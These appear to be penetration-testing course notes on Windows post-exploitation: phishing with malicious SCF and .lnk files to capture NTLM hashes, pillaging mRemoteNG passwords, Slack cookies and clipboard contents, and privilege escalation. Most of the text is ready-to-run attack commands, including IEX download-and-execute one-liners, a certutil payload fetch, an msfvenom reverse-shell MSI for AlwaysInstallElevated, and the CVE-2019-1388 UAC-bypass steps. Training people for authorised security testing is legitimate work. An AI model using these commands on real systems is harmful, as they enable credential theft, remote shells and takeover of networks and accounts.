# Additional Techniques

In this section will cover:
- Interacting with Users (Phishing)
- Pillaging
- Miscellaneous Techniques

## Interacting with Users 

Users are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is "off" on their machine when browsing a shared drive, clicking on a link, or running a file. Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction. One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.

**Traffic Capture**

If Wireshark is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default. Here we can see a rough example of capturing cleartext FTP credentials entered by another user while signed into the same box. While not highly likely, if Wireshark is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.

The tool net-creds can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.

**Process Command Lines**

````
# Monitoring for Process Command Lines

while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}

# Running Monitor Script on Target Host
> IEX (iwr 'http://<Our_IP>/procmon.ps1')
````

**Vulnerable Services**

We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. CVE-2019–15752 is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including docker-credential-wincred.exe, docker-credential-wincred.bat, etc., which do not exist with a Docker installation. The program looks for these files in the C:\PROGRAMDATA\DockerDesktop\version-bin\. This directory was misconfigured to allow full write access to the BUILTIN\Users group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).

**SCF on a File Share**

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

Malicious SCF File

In this example, let's create the following file and name it something like @Inventory.scf (similar to another file in the directory, so it does not appear out of place). We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our tun0 IP address and any fake share name and .ico file name.
````
# Create Malicious SCF File

[Shell]
Command=2
IconFile=\\<Our_IP>\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# Starting Responder
$ sudo responder -wrf -v -I tun0
````

**Malicious .lnk File**

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as Lnkbomb, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:
````
# Generating a Malicious .lnk File

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<Our_IP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
````
Change the directory where the lnk will be saved to a directory that the user will access and that you have write permission for.
- https://github.com/dievus/lnkbomb

## Pillaging

Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

**Data Sources**
Below are some of the sources from which we can obtain information from compromised systems:
- Installed applications
- Installed services
  - Websites
  - File Shares
  - Databases
  - Directory Services (such as Active Directory, Azure AD, etc.)
  - Name Servers
  - Deployment Services
  - Certificate Authority
  - Source Code Management Server
  - Virtualization
  - Messaging
  - Monitoring and Logging Systems
  - Backups
- Sensitive Data
  - Keylogging
  - Screen Capture
  - Network Traffic Capture
  - Previous Audit reports
- User Information
  - History files, interesting documents (.doc/x, .xls/x, password, /pass., etc)
  - Roles and Privileges
  - Web Browsers
  - IM Clients

**Installed Applications**
````
# Identifying Common Applications
> dir "C:\Program Files"

# Get Installed Programs via PowerShell & Registry Keys
> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
````
Example mRemoteNG

mRemoteNG saves connection info and credentials to a file called confCons.xml. They use a hardcoded master password, mR3m, so if anyone starts saving credentials in mRemoteNG and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

By default, the configuration file is located in %USERPROFILE%\APPDATA\Roaming\mRemoteNG.
````
# mRemoteNG Configuration File - confCons.xml

<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
````
This XML document contains a root element called Connections with the information about the encryption used for the credentials and the attribute Protected, which corresponds to the master password used to encrypt the document. We can use this string to attempt to crack the master password. We will find some elements named Node within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.

As mentioned previously, if the user didn't set a custom master password, we can use the script mRemoteNG-Decrypt to decrypt the password. We need to copy the attribute Password content and use it with the option -s. If there's a master password and we know it, we can then use the option -p with the custom master password to also decrypt the password.
````
# Decrypt the Password with mremoteng_decrypt
$ python3 mremoteng_decrypt.py -s "<password_hash>" 

# Decrypt the Password with mremoteng_decrypt and a Custom Password
$ python3 mremoteng_decrypt.py -s "<password_hash>" -p admin

# Brute Force Custom Password
$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<password_hash>" -p $password 2>/dev/null;done
````
**Abusing Cookies to Get Access to IM Clients**

With the ability to instantaneously send messages between co-workers and teams, instant messaging (IM) applications like Slack and Microsoft Teams have become staples of modern office communications. These applications help in improving collaboration between co-workers and teams. If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.

Let's use Slack as an example. Multiple posts refer to how to abuse Slack such as Abusing Slack for Offensive Operations and Phishing for Slack-tokens. We can use them to understand better how Slack tokens and cookies work, but keep in mind that Slack's behavior may have changed since the release of those posts.

There's also a tool called SlackExtract released in 2018, which was able to extract Slack messages. Their research discusses the cookie named d, which Slack uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.

- https://github.com/clr2of8/SlackExtract

````
# Cookie Extraction from Firefox
> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

# Extract Slack Cookie from Firefox Cookies Database
$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
-------------------------------------------------------------------------------------------------------

# Cookie Extraction from Chromium-based Browsers
> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
> Invoke-SharpChromium -Command "cookies slack.com"
````
We got an error because the cookie file path that contains the database is hardcoded in SharpChromium, and the current version of Chrome uses a different location.
We can modify the code of SharpChromium or copy the cookie file to where SharpChromium is looking.
SharpChromium is looking for a file in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies with the following command we will copy the file to the location SharpChromium is expecting.
````
# Copy Cookies to SharpChromium Expected Location
> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

# Invoke-SharpChromium Cookies Extraction
> Invoke-SharpChromium -Command "cookies slack.com"
````
**Clipboard**

The clipboard provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.
````
# Monitor the Clipboard with PowerShell
> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
> Invoke-ClipboardLogger
````

**Roles and Services**

Services on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:
- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

Restic is a modern backup program that can back up files in Linux, BSD, Mac, and Windows. To start working with restic, we must create a repository (the directory where backups will be stored). Restic checks if the environment variable RESTIC_PASSWORD is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository. We will use restic 0.13.1 and back up the repository C:\xampp\htdocs\webapp in E:\restic\ directory. To download the latest version of restic, visit https://github.com/restic/restic/releases/latest. On our target machine, restic is located at C:\Windows\System32\restic.exe.
````
# restic - Initialize Backup Directory
> mkdir E:\restic2; restic.exe -r E:\restic2 init

# restic - Back up a Directory
> $env:RESTIC_PASSWORD = 'Password'
> restic.exe -r E:\restic2\ backup C:\SampleFolder

# restic - Back up a Directory with VSS
> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# restic - Check Backups Saved in a Repository
> restic.exe -r E:\restic2\ snapshots

# restic - Restore a Backup with ID
> restic.exe -r E:\restic2\ restore <ID> --target C:\Restore
````

## Miscellaneous Techniques

**Living Off The Land Binaries and Scripts (LOLBAS)**

The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:

|Code execution	|Code compilation|	File transfers|
|---------------|-----------------|----------------|
|Persistence|	UAC bypass|	Credential theft|
|Dumping process memory|	Keylogging	Evasion|
|DLL hijacking|

````
# Transferring File with Certutil
> certutil.exe -urlcache -split -f http://<Our_IP>:8080/shell.bat shell.bat

# Encoding File with Certutil
> certutil -encode file1 encodedfile

# Decoding File with Certutil
> certutil -decode encodedfile file2
````

**Always Install Elevated**

This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.
- Computer Configuration\Administrative Templates\Windows Components\Windows Installer
- User Configuration\Administrative Templates\Windows Components\Windows Installer
````
# Enumerating Always Install Elevated Settings

> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
````
Exploitation
````
# Generating MSI Package
$ msfvenom -p windows/shell_reverse_tcp lhost=<Our_IP> lport=<Our_Port> -f msi > aie.msi

# Executing MSI Package
> msiexec /i c:\users\<user>\desktop\aie.msi /quiet /qn /norestart
````

**CVE-2019-1388**

CVE-2019-1388 was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The Issued By field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) 1.3.6.1.4.1.311.2.1.10. This OID value is identified in the wintrust.h header as SPC_SP_AGENCY_INFO_OBJID which is the SpcSpAgencyInfo field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as NT AUTHORITY\SYSTEM. Once the browser is opened, it is possible to "break out" of it by leveraging the View page source menu option to launch a cmd.exe or PowerShell.exe console as SYSTEM.
````
# Exploitation

# Step 1 - Right click on the hhupd.exe executable and select Run as administrator from the menu.
# Step 2 - Click on Show information about the publisher's certificate to open the certificate dialog.
# Step 3 - Go back to the General tab and see that the Issued by field is populated with a hyperlink. Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.
# Step 4 -  Right-click anywhere on the web page and choose View page source. Once the page source opens in another tab, right-click again and select Save as, and a Save As dialog box will open.
# Step 5 - Type c:\windows\system32\cmd.exe in the file path and hit enter
````

**Scheduled Tasks**
````
# Enumerating Scheduled Tasks
> schtasks /query /fo LIST /v
> Get-ScheduledTask | select TaskName,State
````

**User/Computer Description Field**
````
# Checking Local User Description Field
> Get-LocalUser

# Enumerating Computer Description Field with Get-WmiObject Cmdlet
> Get-WmiObject -Class Win32_OperatingSystem | select Description
````

**Mount VHDX/VMDK**

Three specific file types of interest are .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of .VMDK and .VHDX files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

````
# Mount VMDK on Linux
$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Mount VHD/VHDX on Linux
$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
````

````
# In windows

1 - Right-click on the file and choose Mount
2 - Use the Disk Management
````
